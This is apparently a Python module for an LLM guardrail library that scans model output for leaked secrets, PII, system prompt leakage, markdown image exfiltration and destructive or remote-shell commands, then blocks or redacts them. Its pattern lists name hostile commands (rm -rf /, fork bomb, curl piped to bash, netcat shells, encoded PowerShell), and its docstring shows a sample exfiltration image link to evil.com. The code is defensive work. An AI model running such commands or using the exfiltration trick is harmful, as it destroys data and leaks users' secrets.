"""
Output Plane - Post-generation model response security & governance.

Evaluates generated outputs from LLMs for:
- System prompt and instruction leakage
- Secret, credential, and API key exposure
- High-risk PII regurgitation (SSN, Credit Cards)
- Dangerous code execution payloads (reverse shells, destructive rm/format)
- Markdown image data exfiltration tags (![leak](http://evil.com?c=...))
- Toxic and harmful payload patterns
"""

import time
import re
from typing import Optional, List, Dict, Tuple
from pygenguard.decision import PlaneResult


# Sensitive Secret Patterns
SECRET_PATTERNS = {
    "openai_key": r"sk-(?:proj-|svcacct-)?[A-Za-z0-9_-]{20,}",
    "aws_access_key": r"(?:A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}",
    "github_pat": r"gh[pousr]_[A-Za-z0-9_]{36,}",
    "jwt_token": r"\beyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.[A-Za-z0-9-_.+/=]+\b",
    "private_key": r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
    "slack_webhook": r"https://hooks\.slack\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+/[a-zA-Z0-9_]+",
    "generic_api_key": r"(?:api[_-]?key|secret[_-]?token|auth[_-]?token)[\s:=]+['\"][a-zA-Z0-9_\-]{16,}['\"]",
}

# High-Risk PII Patterns in Output
PII_OUTPUT_PATTERNS = {
    "ssn": r"\b\d{3}-\d{2}-\d{4}\b",
    "credit_card": r"\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|3(?:0[0-5]|[68][0-9])[0-9]{11}|6(?:011|5[0-9]{2})[0-9]{12})\b",
    "email": r"\b[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\b",
    "phone": r"\b(?:\+?1[-.]?)?\(?\d{3}\)?[-.]?\d{3}[-.]?\d{4}\b",
}

# Dangerous Code Execution Patterns
DANGEROUS_PAYLOADS = [
    r"rm\s+-rf\s+(?:/|~|\$HOME|\*)",
    r"mkfs\.[a-z0-9]+\s+/dev/",
    r":\(\)\{\s*:\|:&\s*\};:",  # Fork bomb
    r"dd\s+if=/dev/zero\s+of=/dev/[a-z]+",
    r"curl\s+-[sSL]*\s+https?://\S+\s*\|\s*(?:bash|sh|zsh)",
    r"wget\s+-[sSLq]*\s+https?://\S+\s*\|\s*(?:bash|sh|zsh)",
    r"nc\s+-[eclnpv]+\s+\d+\.\d+\.\d+\.\d+\s+\d+",
    r"powershell\s+-(?:enc|encodedcommand|executionpolicy\s+bypass)",
    r"Invoke-Expression\s*\(New-Object\s+Net\.WebClient\)",
    r"eval\s*\(\s*base64_decode\s*\(",
]

# Markdown Data Exfiltration Patterns (rendering images that leak URL params)
MARKDOWN_EXFIL_PATTERN = r"!\[.*?\]\(https?://[^\s\)]+(?:\?|&)(?:data|cookie|session|token|auth|user|leak|q)=[^\s\)]+\)"

# Generic System Prompt Leakage Indicators
PROMPT_LEAK_PHRASES = [
    "here is the system prompt:",
    "my initial instructions were:",
    "my hidden instructions are:",
    "the developer gave me the following system instructions:",
    "verbatim instructions from my creators:",
    "i am instructed to never reveal:",
]


class OutputPlane:
    """
    Evaluates and sanitizes model output before delivering to clients.
    
    Checks for:
    - Secret & API key exposure
    - System prompt leakage
    - Dangerous destructive code payloads
    - Markdown image data exfiltration
    - PII leakage
    """
    
    def __init__(
        self,
        block_on_secrets: bool = True,
        block_on_dangerous_code: bool = True,
        block_on_system_leak: bool = True,
        mask_pii_enabled: bool = True,
        custom_canary_tokens: Optional[List[str]] = None
    ):
        self.block_on_secrets = block_on_secrets
        self.block_on_dangerous_code = block_on_dangerous_code
        self.block_on_system_leak = block_on_system_leak
        self.mask_pii_enabled = mask_pii_enabled
        self.canary_tokens = custom_canary_tokens or []
    
    def evaluate(
        self,
        output_text: str,
        prompt: Optional[str] = None,
        system_prompt: Optional[str] = None
    ) -> PlaneResult:
        """
        Evaluate generated output text for security risks.
        
        Args:
            output_text: The model's raw generated text
            prompt: Optional user input prompt for context
            system_prompt: Optional system prompt to check for direct leak
            
        Returns:
            PlaneResult with pass/fail and threat details
        """
        start = time.perf_counter()
        output_lower = output_text.lower()
        
        detected_threats: List[str] = []
        risk_score = 0.0
        should_block = False
        
        # 1. Check for Secret / Key Leaks
        detected_secrets = []
        for sec_name, pattern in SECRET_PATTERNS.items():
            if re.search(pattern, output_text):
                detected_secrets.append(sec_name)
        
        if detected_secrets:
            detected_threats.append(f"Secrets exposed: {detected_secrets}")
            risk_score = max(risk_score, 0.95)
            if self.block_on_secrets:
                should_block = True
                
        # 2. Check for Dangerous Code Execution Payloads
        detected_payloads = []
        for pattern in DANGEROUS_PAYLOADS:
            if re.search(pattern, output_text, re.IGNORECASE):
                detected_payloads.append(pattern)
        
        if detected_payloads:
            detected_threats.append(f"Dangerous code payload detected ({len(detected_payloads)} hits)")
            risk_score = max(risk_score, 0.9)
            if self.block_on_dangerous_code:
                should_block = True
                
        # 3. Check for Markdown Exfiltration
        if re.search(MARKDOWN_EXFIL_PATTERN, output_text, re.IGNORECASE):
            detected_threats.append("Markdown image data exfiltration vector detected")
            risk_score = max(risk_score, 0.85)
            should_block = True
            
        # 4. Check for System Prompt Leakage
        leak_detected = False
        # Check canary tokens
        for token in self.canary_tokens:
            if token and token in output_text:
                leak_detected = True
                detected_threats.append("System canary token leaked in output")
                break
                
        # Check known leak intro phrases
        for phrase in PROMPT_LEAK_PHRASES:
            if phrase in output_lower:
                leak_detected = True
                detected_threats.append(f"System prompt leak phrase: '{phrase}'")
                break
                
        # If full system prompt was provided, check for significant substring overlap (> 30 chars)
        if system_prompt and len(system_prompt.strip()) > 30:
            sys_clean = system_prompt.strip()
            # Check chunks of 35 chars
            for i in range(0, max(1, len(sys_clean) - 35), 25):
                chunk = sys_clean[i:i+35]
                if chunk in output_text:
                    leak_detected = True
                    detected_threats.append("Direct system prompt content match detected")
                    break
                    
        if leak_detected:
            risk_score = max(risk_score, 0.8)
            if self.block_on_system_leak:
                should_block = True
                
        # 5. Check PII
        detected_pii = []
        for pii_name, pattern in PII_PATTERNS_LOCAL.items():
            if re.search(pattern, output_text):
                detected_pii.append(pii_name)
        if detected_pii:
            detected_threats.append(f"PII in output: {detected_pii}")
            risk_score = max(risk_score, 0.5)
            
        passed = not should_block
        details = "; ".join(detected_threats) if detected_threats else "Output verified safe"
        
        return PlaneResult(
            plane_name="output",
            passed=passed,
            risk_score=risk_score,
            details=details,
            latency_ms=(time.perf_counter() - start) * 1000
        )
    
    def sanitize(self, output_text: str) -> str:
        """
        Sanitize and mask sensitive secrets and PII from the output text.
        
        Replaces detected secrets and PII with [REDACTED_...] masks.
        """
        sanitized = output_text
        
        # Redact Secrets
        for sec_name, pattern in SECRET_PATTERNS.items():
            sanitized = re.sub(
                pattern,
                f"[REDACTED_{sec_name.upper()}]",
                sanitized
            )
            
        # Redact High-Risk PII
        for pii_name, pattern in PII_OUTPUT_PATTERNS.items():
            sanitized = re.sub(
                pattern,
                f"[REDACTED_{pii_name.upper()}]",
                sanitized
            )
            
        # Neutralize Markdown Exfiltration
        sanitized = re.sub(
            MARKDOWN_EXFIL_PATTERN,
            "[BLOCKED_IMAGE_EXFILTRATION]",
            sanitized,
            flags=re.IGNORECASE
        )
        
        return sanitized


PII_PATTERNS_LOCAL = PII_OUTPUT_PATTERNS
